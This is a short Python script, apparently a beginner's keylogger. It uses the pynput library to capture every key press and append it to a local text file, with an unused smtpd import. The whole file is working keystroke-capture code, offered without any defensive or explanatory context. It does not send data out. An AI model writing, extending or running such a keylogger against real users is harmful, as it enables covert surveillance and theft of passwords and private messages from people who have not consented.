from pynput import keyboard
import smtpd

def key_pressed(key):
    print(key)
    with open("keylogger_local.txt","a") as f:
        f.write(str(f"{key} \n"))
        
keyboard_listener = keyboard.Listener(on_press=key_pressed)

with keyboard_listener:
    keyboard_listener.join()

